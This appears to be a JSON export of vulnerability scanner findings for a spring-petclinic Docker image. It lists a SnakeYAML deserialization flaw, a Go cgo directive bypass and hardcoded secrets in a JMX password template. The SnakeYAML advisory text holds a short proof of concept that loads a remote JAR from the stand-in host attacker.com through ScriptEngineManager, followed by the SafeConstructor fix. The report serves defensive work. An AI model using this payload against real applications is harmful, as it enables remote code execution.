[
   {
      "user_issue_id": "1713149714042720256",
      "comp_id": "docker://spring-petclinic:3.1.0-SNAPSHOT",
      "component_package_type": "docker",
      "comp_name": "spring-petclinic",
      "comp_version": "3.1.0-SNAPSHOT",
      "type": "security",
      "targets": null,
      "issue_id": "XRAY-262821",
      "paths": [
         "default/my0373-docker-local/spring-petclinic/3.1.0-SNAPSHOT/manifest.json"
      ],
      "watcher_id": "fc59a43acdfa806d13cb47fc",
      "watcher_name": "Security_watch_1",
      "matched_policies": [
         {
            "policy": "Security_policy_1",
            "rule": "Critical_CVEs",
            "is_blocking": false,
            "blocking_mask": 0
         }
      ],
      "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.",
      "severity": "Critical",
      "updated": "2023-10-14T11:08:15Z",
      "permissions": {},
      "is_source_root": false,
      "is_high_profile": true,
      "high_profile_info": {
         "Id": 0,
         "PublicVulnsTblID": 0,
         "VulnId": "XRAY-262821",
         "VulnerabilityTitle": "",
         "ShortDescription": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
         "FullDescription": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
         "Impact": 7,
         "VulnerabilityType": "Remote code execution",
         "Resolution": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc.",
         "ExtendedImpactReasons": [
            {
               "Id": 0,
               "PublicVulnsExtendedTblId": 0,
               "Name": "The issue has an exploit published",
               "Description": "PoC demonstrates remote code execution.",
               "IsPositive": 0,
               "InsertOrder": 4
            },
            {
               "Id": 0,
               "PublicVulnsExtendedTblId": 0,
               "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
               "Description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
               "IsPositive": 1,
               "InsertOrder": 1
            },
            {
               "Id": 0,
               "PublicVulnsExtendedTblId": 0,
               "Name": "The issue results in a severe impact (such as remote code execution)",
               "Description": "Remote code execution.",
               "IsPositive": 0,
               "InsertOrder": 2
            },
            {
               "Id": 0,
               "PublicVulnsExtendedTblId": 0,
               "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
               "Description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments.",
               "IsPositive": 0,
               "InsertOrder": 3
            }
         ],
         "ExtendedReferences": [
            {
               "Id": 0,
               "PublicVulnsExtendedTblId": 0,
               "RefType": "Patch",
               "Title": "Fixing commit",
               "Url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/2b8d47c8bcfd402e7a682b7b2674e8d0cb25e522",
               "InsertOrder": 1
            },
            {
               "Id": 0,
               "PublicVulnsExtendedTblId": 0,
               "RefType": "Advisory",
               "Title": "GitHub Advisory",
               "Url": "https://github.com/advisories/GHSA-mjmj-j48q-9wg2",
               "InsertOrder": 2
            }
         ],
         "ExtendedRelatedVulns": null
      },
      "is_exposures_issue": false,
      "source": "org.yaml:snakeyaml",
      "source_version": "1.33",
      "source_id": "gav://org.yaml:snakeyaml",
      "component_physical_paths": [
         "sha256__2547a948987c670df3f6e9575f90adb629f64de0711765dee6fc4c615ee2d120.tar.gz/workspace/BOOT-INF/lib/snakeyaml-1.33.jar"
      ]
   },
   {
      "user_issue_id": "1713149714013360128",
      "comp_id": "docker://spring-petclinic:3.1.0-SNAPSHOT",
      "component_package_type": "docker",
      "comp_name": "spring-petclinic",
      "comp_version": "3.1.0-SNAPSHOT",
      "type": "security",
      "targets": null,
      "issue_id": "XRAY-533052",
      "paths": [
         "default/my0373-docker-local/spring-petclinic/3.1.0-SNAPSHOT/manifest.json"
      ],
      "watcher_id": "fc59a43acdfa806d13cb47fc",
      "watcher_name": "Security_watch_1",
      "matched_policies": [
         {
            "policy": "Security_policy_1",
            "rule": "Critical_CVEs",
            "is_blocking": false,
            "blocking_mask": 0
         }
      ],
      "summary": "Line directives (\"//line\") can be used to bypass the restrictions on \"//go:cgo_\" directives, allowing blocked linker and compiler flags to be passed during compilation. This can result in unexpected execution of arbitrary code when running \"go build\". The line directive requires the absolute path of the file in which the directive lives, which makes exploiting this issue significantly more complex.",
      "severity": "Critical",
      "updated": "2023-10-14T11:08:15Z",
      "permissions": {},
      "is_source_root": false,
      "is_high_profile": false,
      "is_exposures_issue": false,
      "source": "github.com/golang/go",
      "source_version": "1.20.5",
      "source_id": "go://github.com/golang/go",
      "component_physical_paths": [
         "sha256__61e0cfcb6f3543ca620b2da9d5e475cb85dd48e92d82e119919ea667f4371a6c.tar.gz/layers/paketo-buildpacks_ca-certificates/helper/helper/github.com/golang/go",
         "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/github.com/golang/go",
         "sha256__3f5f857a24121a63acf8e6415c9cec7790df50647a8bcb4e0f1278ece3826345.tar.gz/layers/paketo-buildpacks_spring-boot/helper/helper/github.com/golang/go"
      ]
   },
   {
      "user_issue_id": "1713149714013360128",
      "comp_id": "docker://spring-petclinic:3.1.0-SNAPSHOT",
      "component_package_type": "docker",
      "comp_name": "spring-petclinic",
      "comp_version": "3.1.0-SNAPSHOT",
      "type": "security",
      "targets": null,
      "issue_id": "XRAY-533052",
      "paths": [
         "default/my0373-docker-local/spring-petclinic/3.1.0-SNAPSHOT/manifest.json"
      ],
      "watcher_id": "fc59a43acdfa806d13cb47fc",
      "watcher_name": "Security_watch_1",
      "matched_policies": [
         {
            "policy": "Security_policy_1",
            "rule": "Critical_CVEs",
            "is_blocking": false,
            "blocking_mask": 0
         }
      ],
      "summary": "Line directives (\"//line\") can be used to bypass the restrictions on \"//go:cgo_\" directives, allowing blocked linker and compiler flags to be passed during compilation. This can result in unexpected execution of arbitrary code when running \"go build\". The line directive requires the absolute path of the file in which the directive lives, which makes exploiting this issue significantly more complex.",
      "severity": "Critical",
      "updated": "2023-10-14T11:08:15Z",
      "permissions": {},
      "is_source_root": false,
      "is_high_profile": false,
      "is_exposures_issue": false,
      "source": "github.com/golang/go",
      "source_version": "1.19.11",
      "source_id": "go://github.com/golang/go",
      "component_physical_paths": [
         "sha256__6b2f3c473f38b33b59e7b51e8ffd3e3e3a32137c664b8490b5699c243dd76ea4.tar.gz/cnb/lifecycle/launcher/github.com/golang/go"
      ]
   },
   {
      "user_issue_id": "1713155208920698880",
      "comp_id": "docker://spring-petclinic:3.1.0-SNAPSHOT",
      "component_package_type": "docker",
      "comp_name": "spring-petclinic",
      "comp_version": "3.1.0-SNAPSHOT",
      "type": "security",
      "targets": null,
      "issue_id": "EXP-1681-00001",
      "paths": [
         "default/my0373-docker-local/spring-petclinic/3.1.0-SNAPSHOT/manifest.json"
      ],
      "watcher_id": "fc59a43acdfa806d13cb47fc",
      "watcher_name": "Security_watch_1",
      "matched_policies": [
         {
            "policy": "Security_policy_1",
            "rule": "High_Exposures",
            "is_blocking": false,
            "blocking_mask": 0
         }
      ],
      "summary": "Hardcoded secrets were found",
      "severity": "High",
      "updated": "2023-10-14T11:30:05Z",
      "permissions": {},
      "is_source_root": true,
      "is_high_profile": false,
      "is_exposures_issue": true,
      "exposures_data": {
         "category": "secrets",
         "file_path": "/layers/paketo-buildpacks_bellsoft-liberica/jre/conf/management/jmxremote.password.template",
         "repo": "my0373-docker-local",
         "path": "/spring-petclinic/3.1.0-SNAPSHOT/manifest.json"
      },
      "source": "spring-petclinic",
      "source_version": "3.1.0-SNAPSHOT",
      "source_id": "docker://spring-petclinic"
   }
]
